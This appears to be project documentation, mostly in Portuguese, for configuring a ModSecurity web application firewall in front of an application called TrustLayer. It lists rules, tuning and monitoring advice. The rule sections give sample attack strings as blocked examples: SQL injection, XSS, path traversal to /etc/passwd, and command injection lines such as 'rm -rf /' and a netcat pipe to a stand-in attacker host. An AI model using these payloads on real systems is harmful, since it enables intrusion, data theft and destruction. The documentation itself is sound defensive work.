# Web Application Firewall (WAF) Configuration

TrustLayer integrates with ModSecurity WAF para proteger contra ataques web comuns (OWASP Top 10).

---

## 📋 Índice

- [Visão Geral](#visão-geral)
- [Arquitetura](#arquitetura)
- [Regras Implementadas](#regras-implementadas)
- [Configuração](#configuração)
- [Modos de Operação](#modos-de-operação)
- [Troubleshooting](#troubleshooting)
- [Tuning](#tuning)

---

## 🎯 Visão Geral

ModSecurity é um Web Application Firewall (WAF) open-source que protege aplicações web contra:

- ✅ SQL Injection
- ✅ Cross-Site Scripting (XSS)
- ✅ Path Traversal / Local File Inclusion (LFI)
- ✅ Remote Code Execution (RCE)
- ✅ CSRF (Cross-Site Request Forgery)
- ✅ Scanner Detection
- ✅ Malicious File Uploads
- ✅ Protocol Violations
- ✅ Rate Limiting / DoS Protection

---

## 🏗️ Arquitetura

```
┌─────────────┐
│   Internet  │
└──────┬──────┘
       │
       ▼
┌──────────────┐
│ Load Balancer│
└──────┬───────┘
       │
       ▼
┌──────────────────────────────┐
│    Ingress Controller        │
│  (NGINX + ModSecurity)       │
│                              │
│  ┌────────────────────────┐ │
│  │   ModSecurity WAF      │ │
│  │                        │ │
│  │  - OWASP CRS 3.3.x     │ │
│  │  - TrustLayer Rules    │ │
│  │  - Rate Limiting       │ │
│  └────────────────────────┘ │
└──────┬───────────────────────┘
       │
       ▼
┌──────────────┐
│  TrustLayer  │
│   Frontend   │
└──────────────┘
```

---

## 🛡️ Regras Implementadas

### 1. SQL Injection Protection

Detecta tentativas de injeção SQL usando LibInjection:

```
SecRule ARGS|REQUEST_BODY "@detectSQLi" \
  "id:1001,block,msg:'SQL Injection Attack Detected'"
```

**Bloqueado**:
- `' OR 1=1--`
- `UNION SELECT * FROM users`
- `admin'--`

### 2. XSS Protection

Detecta tentativas de Cross-Site Scripting:

```
SecRule ARGS|REQUEST_BODY "@detectXSS" \
  "id:1002,block,msg:'XSS Attack Detected'"
```

**Bloqueado**:
- `<script>alert('xss')</script>`
- `javascript:void(0)`
- `<img src=x onerror=alert(1)>`

### 3. Path Traversal Protection

Bloqueia tentativas de acesso a arquivos do sistema:

```
SecRule REQUEST_URI|ARGS "@pmFromFile lfi-os-files.data" \
  "id:1003,block,msg:'Path Traversal Attack Detected'"
```

**Bloqueado**:
- `../../../etc/passwd`
- `..%2F..%2Fetc%2Fshadow`
- `c:\windows\win.ini`

### 4. Command Injection Protection

Detecta tentativas de execução de comandos:

```
SecRule ARGS "@rx (?:cmd|bash|sh|powershell|exec)" \
  "id:1004,block,msg:'Command Injection Detected'"
```

**Bloqueado**:
- `; rm -rf /`
- `| nc attacker.com 4444`
- `` `whoami` ``

### 5. CSRF Protection

Requer CSRF token em requisições mutantes:

```
SecRule REQUEST_METHOD "@rx ^(POST|PUT|DELETE|PATCH)$" \
  "id:1005,chain,msg:'Missing CSRF Token'"
  SecRule &REQUEST_HEADERS:X-CSRF-Token "@eq 0"
```

### 6. Rate Limiting

Bloqueia IPs que excedem rate limit:

```
# Default: 100 requests per 60 seconds
SecRule IP:REQUESTS_COUNT "@gt 100" \
  "id:1101,deny,status:429,msg:'Rate limit exceeded'"
```

### 7. Scanner Detection

Bloqueia ferramentas de scanning conhecidas:

```
SecRule REQUEST_HEADERS:User-Agent "@pm nikto nmap sqlmap" \
  "id:1300,block,msg:'Security Scanner Detected'"
```

**Bloqueado**:
- Nikto
- Nmap NSE
- SQLMap
- Acunetix
- Burp Suite
- w3af

### 8. File Upload Protection

Bloqueia upload de arquivos perigosos:

```
SecRule FILES "@rx \.(php|exe|sh|bat|cmd)$" \
  "id:1400,block,msg:'Dangerous File Upload Detected'"
```

### 9. Protocol Violations

Valida requisições HTTP:

```
# Require Host header
SecRule &REQUEST_HEADERS:Host "@eq 0" \
  "id:1200,block,msg:'Missing Host Header'"

# No multiple Host headers
SecRule &REQUEST_HEADERS:Host "!@eq 1" \
  "id:1201,block,msg:'Multiple Host Headers'"
```

### 10. TrustLayer-Specific Rules

Proteção customizada para endpoints do TrustLayer:

```
# Protect admin endpoints
SecRule REQUEST_URI "@beginsWith /api/admin/" \
  "id:2000,chain,msg:'Admin endpoint requires auth'"
  SecRule &REQUEST_HEADERS:Authorization "@eq 0" "deny,status:401"

# Block access to backup files
SecRule REQUEST_URI "@rx \.(bak|old|backup|~|swp)$" \
  "id:2003,deny,status:404"
```

---

## ⚙️ Configuração

### Habilitar WAF

```yaml
# helm/trustlayer/values.yaml
waf:
  enabled: true
  ruleEngine: "DetectionOnly"  # Start in detection mode
  owaspCRS:
    enabled: true
```

### Deploy com WAF

```bash
helm install trustlayer ./helm/trustlayer \
  --set waf.enabled=true \
  --set waf.ruleEngine=DetectionOnly
```

### Verificar Logs

```bash
# Check ModSecurity audit logs
kubectl exec -it <ingress-pod> -- tail -f /var/log/modsec_audit.log

# Check blocked requests
kubectl logs <ingress-pod> | grep "ModSecurity: Access denied"
```

---

## 🔄 Modos de Operação

### 1. DetectionOnly (Recomendado para Testing)

Logs ataques mas **não bloqueia**:

```yaml
waf:
  ruleEngine: "DetectionOnly"
```

**Use quando**:
- Primeira implementação
- Testando regras novas
- Troubleshooting false positives

### 2. On (Produção)

Bloqueia requisições maliciosas:

```yaml
waf:
  ruleEngine: "On"
```

**Use quando**:
- Após período de testing (1-2 semanas)
- False positives ajustados
- Regras tuned para a aplicação

### 3. Off (Desabilitado)

Desabilita o WAF completamente:

```yaml
waf:
  ruleEngine: "Off"
```

**Use apenas para**:
- Emergency bypass (incident response)
- Troubleshooting (temporary)

---

## 🔍 Troubleshooting

### False Positives

Se requisições legítimas estão sendo bloqueadas:

**1. Identificar a regra**:

```bash
# Check audit log
kubectl exec -it <ingress-pod> -- cat /var/log/modsec_audit.log | grep "id:"
```

Exemplo de output:
```
[id "1001"] [msg "SQL Injection Attack Detected"] [data "Matched Data: select"]
```

**2. Ajustar threshold (OWASP CRS)**:

```yaml
waf:
  owaspCRS:
    anomalyScoreThreshold: 60  # Increase from 5 to 60 (more relaxed)
```

**3. Disable specific rule**:

```yaml
waf:
  customRules: |
    # Disable rule 1001
    SecRuleRemoveById 1001
```

**4. Whitelist specific path**:

```yaml
waf:
  customRules: |
    # Allow /api/import endpoint
    SecRule REQUEST_URI "@beginsWith /api/import" \
      "id:9000,phase:1,pass,nolog,ctl:ruleEngine=Off"
```

### Performance Issues

Se o WAF está causando latência:

**1. Disable response body inspection**:

```yaml
waf:
  responseBodyAccess: "Off"
```

**2. Reduce request body limit**:

```yaml
waf:
  requestBodyLimit: 1048576  # 1 MB instead of 12.5 MB
```

**3. Disable expensive rules**:

```yaml
waf:
  customRules: |
    # Disable response scanning
    SecRuleRemoveById 950000-959999
```

### High Memory Usage

Se o Ingress Controller está usando muita memória:

**1. Reduce in-memory buffer**:

```yaml
waf:
  requestBodyInMemoryLimit: 65536  # 64 KB instead of 128 KB
```

**2. Increase Ingress resources**:

```yaml
# Ingress controller values
resources:
  limits:
    memory: 2Gi  # Increase from 1Gi
```

---

## 🎛️ Tuning

### Rate Limiting

Ajustar para o seu tráfego:

```yaml
waf:
  rateLimitRequests: 200  # Increase from 100
  rateLimitWindow: 60     # Keep at 60 seconds
```

### OWASP CRS Anomaly Scoring

Controla quantos pontos são necessários para bloquear:

```yaml
waf:
  owaspCRS:
    anomalyScoreThreshold: 5   # Strict (production)
    # anomalyScoreThreshold: 60  # Relaxed (development)
```

**Score values**:
- CRITICAL: 5 points
- ERROR: 4 points
- WARNING: 3 points
- NOTICE: 2 points

**Thresholds**:
- `5`: Block on any CRITICAL finding
- `10`: Require 2x CRITICAL or 1x CRITICAL + 1x ERROR
- `60`: Very relaxed, multiple findings required

### Custom Rules Priority

Adicione regras customizadas com IDs 9000+:

```yaml
waf:
  customRules: |
    # Allow specific IP range (whitelist)
    SecRule REMOTE_ADDR "@ipMatch 10.0.0.0/8" \
      "id:9001,phase:1,pass,nolog,ctl:ruleEngine=Off"

    # Block specific country (GeoIP required)
    SecRule GEOIP:COUNTRY_CODE "@streq CN" \
      "id:9002,phase:1,deny,status:403,msg:'Country blocked'"

    # Custom pattern blocking
    SecRule ARGS "@rx malicious-pattern" \
      "id:9003,phase:2,block,msg:'Custom pattern detected'"
```

---

## 📊 Monitoring

### Metrics

ModSecurity expõe métricas no Prometheus:

```promql
# Requests blocked by WAF
rate(nginx_ingress_controller_modsecurity_blocked_total[5m])

# WAF processing time
histogram_quantile(0.95, rate(nginx_ingress_controller_modsecurity_process_duration_seconds_bucket[5m]))
```

### Alerts

PrometheusRule recomendado:

```yaml
- alert: WAFHighBlockRate
  expr: rate(modsecurity_blocked_total[5m]) > 10
  for: 5m
  annotations:
    summary: "WAF blocking many requests"

- alert: WAFHighLatency
  expr: histogram_quantile(0.95, rate(modsecurity_process_duration_seconds_bucket[5m])) > 0.5
  for: 5m
  annotations:
    summary: "WAF processing time high"
```

---

## 🔐 Security Best Practices

1. **Start in DetectionOnly mode**
   - Run for 1-2 weeks
   - Review logs daily
   - Tune false positives

2. **Enable OWASP CRS**
   - Production-ready ruleset
   - Regular updates
   - Community-tested

3. **Monitor audit logs**
   - Ship to SIEM
   - Alert on critical findings
   - Review weekly

4. **Keep rules updated**
   - Update OWASP CRS regularly
   - Subscribe to security advisories
   - Test updates in staging

5. **Defense in depth**
   - WAF is NOT a replacement for secure code
   - Use with other controls (RLS, RBAC, validation)
   - Regular security audits

---

## 📚 References

- [ModSecurity Documentation](https://github.com/SpiderLabs/ModSecurity/wiki)
- [OWASP CRS](https://coreruleset.org/)
- [NGINX ModSecurity Module](https://github.com/SpiderLabs/ModSecurity-nginx)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
